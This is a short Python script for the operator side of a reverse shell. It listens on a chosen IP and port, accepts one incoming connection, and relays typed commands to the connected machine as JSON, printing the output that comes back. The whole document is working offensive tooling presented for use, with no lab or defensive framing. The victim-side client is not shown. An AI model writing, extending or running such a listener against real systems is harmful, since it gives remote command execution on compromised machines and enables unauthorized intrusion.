## basic reverse shell server code.
import socket
import argparse
import json
from colorama import Fore, Back, Style

# Main Server function

def server(ip, port):
	global target

	listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	listner.bind((ip, int(port)))
	listner.listen(0)
	print(Fore.LIGHTGREEN_EX + '[+] Listening on ' + ip + ':' + port + '...' + Style.RESET_ALL)
	target, address = listner.accept()
	print(Fore.LIGHTGREEN_EX + f'[+] Got Connection From: {address[0]}:{address[1]}' + Style.RESET_ALL)
    

# Send Function
def send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode('utf-8'))


# Recieve Function
def recieve():
	json_data = ''
	while True:
		try:
			json_data += target.recv(1024).decode('utf-8')
			return json.loads(json_data)
		except ValueError:
			continue


# Run Command Function
def run():
	while True:
		command = input('Shell#: ')

		# if there is no command then no execute or processing
		if not command:
			continue

		send(command)
		if command == 'exit':
			break

		result = recieve().encode('utf-8')
		print(result.decode('utf-8'))



# Main Function
def main():
	parser = argparse.ArgumentParser(description="Basic Reverse Shell Server")
	parser.add_argument('ip', help="Ip address of you server (e.g., 192.168.1.14)")
	parser.add_argument('port', help="Port of your server (e.g., 4444)")

	args = parser.parse_args()

	server(args.ip, args.port)
	run()


if __name__ == "__main__":
	main();